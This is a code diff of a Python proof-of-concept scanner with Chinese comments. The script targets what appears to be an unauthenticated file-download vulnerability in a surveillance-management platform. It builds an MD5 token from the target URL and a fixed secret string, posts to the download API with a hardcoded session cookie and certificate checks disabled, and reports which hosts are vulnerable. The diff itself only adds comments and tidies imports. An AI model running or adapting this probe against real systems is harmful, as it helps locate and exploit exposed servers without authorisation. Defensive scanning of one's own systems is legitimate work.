@@ -1,11 +1,11 @@
-import requests
-import urllib3
-import urllib
-import hashlib
-import argparse
 from colorama import init
 from colorama import Fore
+import urllib3
+import hashlib
+import urllib.parse
+import requests
 
+# 初始化 colorama 以支持控制台中的彩色输出
 init(autoreset=True)
 urllib3.disable_warnings()
 
@@ -14,7 +14,7 @@ head = {
     "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169"
 }
 
-
+# 计算输入 URL 的 MD5 哈希值
 def md5encode(url):
     if url.endswith("/"):
         path = "eps/api/resourceOperations/downloadsecretKeyIbuilding"
@@ -25,7 +25,7 @@ def md5encode(url):
     input_name.update(encodetext.encode("utf-8"))
     return input_name.hexdigest().upper()
 
-
+# 检测文件下载漏洞
 def poc_download(url):
     if url.endswith("/"):
         path = "eps/api/resourceOperations/download?token="
@@ -35,18 +35,19 @@ def poc_download(url):
     data = {
         "service": urllib.parse.quote(url + "/home/index.action")
     }
+
     try:
         response = requests.post(url=pocurl, headers=head, data=data, verify=False, timeout=3)
         if response.status_code == 200:
-            print(Fore.GREEN + f"[+]{url}存在文件下载漏洞！！！！")
+            print(Fore.GREEN + f"[+] {url} 存在文件下载漏洞！！！！")
             return True
         else:
-            print(Fore.RED + f"[-]{url}不存在文件下载漏洞")
+            print(Fore.RED + f"[-] {url} 不存在文件下载漏洞")
             return False
     except:
         pass
 
-
+# 主程序入口
 if __name__ == '__main__':
     while True:
         input_url = input("请输入URL（输入 q 退出）：")
